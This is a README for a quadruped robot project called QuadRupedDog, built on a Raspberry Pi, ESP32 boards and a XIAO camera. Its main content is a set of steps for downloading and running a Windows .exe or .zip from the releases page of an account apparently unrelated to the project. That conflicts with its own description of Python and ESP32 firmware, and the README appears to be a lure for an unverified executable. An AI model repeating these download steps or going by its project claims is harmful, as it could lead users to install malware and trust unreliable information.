# 🐾 QuadRupedDog - Simple Robot Walking Control

[![Download QuadRupedDog](https://img.shields.io/badge/Download-QuadRupedDog-brightgreen?style=for-the-badge)](https://github.com/speakeridentificationmaisonette158/QuadRupedDog/releases)

## 🐕 What is QuadRupedDog?

QuadRupedDog is a walking robot shaped like a dog. It uses a small Raspberry Pi computer to think and send commands. Tiny ESP32 chips control the robot’s legs and servos. A small XIAO camera acts as its eyes. The robot parts work together over three separate nodes to move and react.  

This project shows how to build and run a robot that can walk using simple parts and easy setup. Its design can be helpful for beginners interested in robotics or small embedded systems.

## 🎯 Main Features

- Walks like a four-legged dog with smooth leg movement  
- Uses Raspberry Pi to control behavior and process data  
- ESP32 microcontrollers handle servo motors for precise leg motion  
- XIAO camera module captures images to help the robot “see”  
- Three-node network setup to divide tasks and simplify control  
- Open-source code to explore how robotics and embedded systems work  

## 💻 System Requirements

Make sure your Windows computer meets these needs before you start.

- Windows 10 or newer (64-bit recommended)  
- At least 4 GB of RAM  
- 500 MB of free hard drive space  
- USB port for connecting devices (if applicable)  
- Internet connection to download the software  

## 📥 Download the Application

Click the button below to visit the download page. You will find the latest version of QuadRupedDog there.  

[![Get QuadRupedDog](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/speakeridentificationmaisonette158/QuadRupedDog/releases)

Follow these steps:  

1. Open the download page by clicking the button above.  
2. Look for the latest stable release. Usually, it is marked with a version number like `v1.0`.  
3. Find the file that works with Windows, usually ending in `.exe` or `.zip`.  
4. Click the file to start downloading it to your computer.  
5. Wait until the download finishes completely before moving on.  

## ⚙️ Installation and Setup

Once the download completes, you will install and run the program. The process depends on the file type you downloaded.

### If you downloaded an `.exe` file:

1. Double-click the `.exe` file to run the installer.  
2. Follow the on-screen steps. You can usually accept the default choices.  
3. After the installation finishes, find the QuadRupedDog app in your Start menu or desktop.  
4. Double-click it to open the program.  

### If you downloaded a `.zip` file:

1. Right-click the `.zip` file and choose “Extract All.”  
2. Select a place on your computer to extract the files.  
3. Open the folder you extracted to and look for a file named something like `QuadRupedDog.exe`.  
4. Double-click this file to start the program.  

## 🦾 How to Use QuadRupedDog

This section explains the basic steps to run the robot control software.

1. Connect your Raspberry Pi and ESP32 devices if required. Follow the hardware guides included in the repository for connections.  
2. Launch the QuadRupedDog app on your Windows PC.  
3. Use the simple on-screen buttons to start and stop the robot’s walking motion.  
4. Check the camera feed from the XIAO module inside the app to monitor what the robot sees.  
5. Try different walking speeds or directions using provided controls.  
6. If the robot does not respond, check that all hardware is on and properly connected. Restart the app if needed.  

## 🔧 Troubleshooting Tips

- If the program does not start, make sure Windows has the latest updates.  
- Check your internet connection during download and installation.  
- Ensure all robot hardware (Raspberry Pi, ESP32, servos, camera) is powered on and connected correctly.  
- Close other apps that may block USB ports or network connections.  
- If the robot moves oddly, restart the motors and recalibrate from the app controls.  
- Consult the GitHub repository for hardware setup guides in case of connection issues.  

## 📚 More Information

The software mainly uses Python and PlatformIO firmware for ESP32 control. It handles inverse kinematics to move the robot legs smoothly. The three-node setup splits computing tasks among the Raspberry Pi and two ESP32 microcontrollers.

You may explore the source code on the GitHub page to learn more. The project is tagged with embedded-systems, servo-control, robotics, and other relevant topics to guide advanced users.

## ⚡ Need Support?

For questions or help, use the GitHub Issues section in this repository. Provide clear details about your setup and the problem you face. This will help others assist you faster.